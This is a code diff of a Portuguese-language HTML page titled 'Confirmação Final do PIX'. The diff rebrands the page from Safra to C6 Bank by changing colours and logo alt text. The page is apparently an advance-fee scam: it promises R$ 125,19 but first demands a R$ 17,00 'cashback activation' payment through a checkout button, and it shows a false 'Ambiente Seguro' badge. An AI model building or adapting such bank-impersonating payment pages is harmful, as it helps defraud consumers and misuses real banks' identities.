@@ -16,11 +16,11 @@
             theme: {
                 extend: {
                     colors: {
-                        'cred-green': '#020031',
-                        'cred-dark': '#0B0A52',
-                        'cred-light': '#020031',
+                        'cred-green': '#000000',
+                        'cred-dark': '#1A1A1A',
+                        'cred-light': '#000000',
                         'cred-bg': '#DCFCE7',
-                        'cred-accent': '#020031',
+                        'cred-accent': '#000000',
                     }
                 }
             }
@@ -84,19 +84,19 @@
         }
 
         .btn-cred {
-            background: linear-gradient(135deg, #020031 0%, #0B0A52 100%);
-            box-shadow: 0 4px 15px rgba(2, 0, 49, 0.3);
+            background: linear-gradient(135deg, #000000 0%, #1A1A1A 100%);
+            box-shadow: 0 4px 15px rgba(0,0,0, 0.3);
             transition: all 0.3s ease;
         }
 
         .btn-cred:hover {
             filter: brightness(1.05);
-            box-shadow: 0 6px 20px rgba(2, 0, 49, 0.4);
+            box-shadow: 0 6px 20px rgba(0,0,0, 0.4);
             transform: translateY(-2px);
         }
 
         .countdown-box {
-            background: linear-gradient(135deg, #020031 0%, #0B0A52 100%);
+            background: linear-gradient(135deg, #000000 0%, #1A1A1A 100%);
         }
 
         .cashback-box {
@@ -116,7 +116,7 @@
 .ss-footer-links span{opacity:.4;font-size:12px}
 .ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
 .ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
-.ss-footer-badges svg{width:14px;height:14px;color:#020031}
+.ss-footer-badges svg{width:14px;height:14px;color:#000000}
 .ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
 .ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
 .ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
@@ -130,14 +130,14 @@
 .ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
 .ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
 .ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
-.ss-contact-icon{width:48px;height:48px;background:#020031;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon{width:48px;height:48px;background:#000000;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
 .ss-contact-icon svg{color:#fff;width:24px;height:24px}
 .ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
 .ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
 .ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
 .ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
 .ss-contact-note p:last-child{margin-bottom:0}
-.ss-contact-note strong{color:#020031}
+.ss-contact-note strong{color:#000000}
 
 </style>
 </head>
@@ -147,7 +147,7 @@
     <header>
         <div class="flex flex-wrap items-center justify-center p-4 bg-white border-b border-gray-100 shadow-sm sticky top-0 z-10">
             <div class="flex items-center justify-center">
-                <img src="../../images/logo.png?v=safra2" alt="Safra" class="logo-img">
+                <img src="../../images/logo.png?v=safra2" alt="C6 Bank" class="logo-img">
             </div>
         </div>
     </header>
@@ -157,7 +157,7 @@
             <div class="bg-white rounded-2xl shadow-lg border border-gray-100 p-6 md:p-8 fade-in">
                 
                 <!-- Header Banner -->
-                <div class="bg-gradient-to-r from-[#020031] to-[#0B0A52] text-white text-center py-6 px-6 rounded-xl mb-6">
+                <div class="bg-gradient-to-r from-[#000000] to-[#1A1A1A] text-white text-center py-6 px-6 rounded-xl mb-6">
                     <h1 class="text-2xl font-bold mb-2">Confirmação Final do PIX</h1>
                     <p class="text-lg opacity-95">Ative seu cashback e receba o valor total</p>
                 </div>
@@ -205,9 +205,9 @@
                     })();
                     </script>
                     
-                    <div class="bg-[#DCFCE7] border-2 border-[#020031] rounded-lg p-4 mt-3 flex justify-between items-center">
+                    <div class="bg-[#DCFCE7] border-2 border-[#000000] rounded-lg p-4 mt-3 flex justify-between items-center">
                         <span class="font-bold text-gray-900">Valor a receber:</span>
-                        <span id="valor-aprovado" class="text-2xl font-bold text-[#020031]">R$&nbsp;125,19</span>
+                        <span id="valor-aprovado" class="text-2xl font-bold text-[#000000]">R$&nbsp;125,19</span>
 
                         <script>
                             // Parser robusto
@@ -266,10 +266,10 @@
                 </div>
 
                 <!-- Cashback Box -->
-                <div class="rounded-xl p-6 mb-6" style="background:linear-gradient(135deg,#F8F8F8 0%,#E8EAF6 100%);border:2px solid rgba(15,0,61,0.2);">
-                    <h3 class="text-xl font-bold text-[#020031] mb-3 text-center">Ativação do Cashback Safra</h3>
-                    <div class="text-4xl font-bold text-[#020031] text-center my-4">R$ 17,00</div>
-                    <p class="text-[#020031] text-center">
+                <div class="rounded-xl p-6 mb-6" style="background:linear-gradient(135deg,#F8F8F8 0%,#ECECEC 100%);border:2px solid rgba(0,0,0,0.2);">
+                    <h3 class="text-xl font-bold text-[#000000] mb-3 text-center">Ativação do Cashback Safra</h3>
+                    <div class="text-4xl font-bold text-[#000000] text-center my-4">R$ 17,00</div>
+                    <p class="text-[#000000] text-center">
                         Para liberar o valor total e receber de volta todas as taxas pagas, é necessário confirmar a
                         ativação do Cashback no valor de R$ 17,00 (1%).
                     </p>
@@ -279,7 +279,7 @@
                 <ul class="space-y-3 mb-6">
                     <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
                         <div class="flex-shrink-0 w-6 h-6 bg-[#DCFCE7] rounded-full flex items-center justify-center">
-                            <svg class="w-4 h-4 text-[#020031]" fill="currentColor" viewBox="0 0 20 20">
+                            <svg class="w-4 h-4 text-[#000000]" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
                             </svg>
                         </div>
@@ -287,7 +287,7 @@
                     </li>
                     <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
                         <div class="flex-shrink-0 w-6 h-6 bg-[#DCFCE7] rounded-full flex items-center justify-center">
-                            <svg class="w-4 h-4 text-[#020031]" fill="currentColor" viewBox="0 0 20 20">
+                            <svg class="w-4 h-4 text-[#000000]" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
                             </svg>
                         </div>
@@ -295,7 +295,7 @@
                     </li>
                     <li class="flex items-center gap-3 text-gray-700 py-2 border-b border-gray-100">
                         <div class="flex-shrink-0 w-6 h-6 bg-[#DCFCE7] rounded-full flex items-center justify-center">
-                            <svg class="w-4 h-4 text-[#020031]" fill="currentColor" viewBox="0 0 20 20">
+                            <svg class="w-4 h-4 text-[#000000]" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
                             </svg>
                         </div>
@@ -303,7 +303,7 @@
                     </li>
                     <li class="flex items-center gap-3 text-gray-700 py-2">
                         <div class="flex-shrink-0 w-6 h-6 bg-[#DCFCE7] rounded-full flex items-center justify-center">
-                            <svg class="w-4 h-4 text-[#020031]" fill="currentColor" viewBox="0 0 20 20">
+                            <svg class="w-4 h-4 text-[#000000]" fill="currentColor" viewBox="0 0 20 20">
                                 <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"></path>
                             </svg>
                         </div>
@@ -318,7 +318,7 @@
                 </div>
 
                 <!-- CTA Button -->
-                <button onclick="redirectToCheckout()" class="w-full text-white py-4 rounded-xl text-lg font-bold mb-4" style="background:linear-gradient(90deg,#020031 0%,#FDAC17 100%);box-shadow:0 4px 15px rgba(2, 0, 49,0.3);transition:all 0.3s ease;">
+                <button onclick="redirectToCheckout()" class="w-full text-white py-4 rounded-xl text-lg font-bold mb-4" style="background:linear-gradient(90deg,#000000 0%,#FDAC17 100%);box-shadow:0 4px 15px rgba(0,0,0,0.3);transition:all 0.3s ease;">
                     Ativar cashback agora
                 </button>
 
@@ -330,10 +330,10 @@
 
                 <!-- Security Badge -->
                 <div class="flex items-center justify-center gap-2 p-3 bg-[#DCFCE7] rounded-lg border border-[#86EFAC] mt-4">
-                    <svg class="w-5 h-5 text-[#020031]" fill="currentColor" viewBox="0 0 20 20">
+                    <svg class="w-5 h-5 text-[#000000]" fill="currentColor" viewBox="0 0 20 20">
                         <path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
                     </svg>
-                    <span class="text-sm font-semibold text-[#0B0A52]">Ambiente Seguro</span>
+                    <span class="text-sm font-semibold text-[#1A1A1A]">Ambiente Seguro</span>
                 </div>
             </div>
         </div>
@@ -383,7 +383,7 @@
     </script>
 <!-- FOOTER SAFRA -->
 <footer class="ss-footer">
-  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="Safra"></div>
+  <div class="ss-footer-logo"><img src="../../images/logo.png?v=safra2" alt="C6 Bank"></div>
   <p class="ss-footer-company">&copy; 2025 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
   <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
   <div class="ss-footer-links">
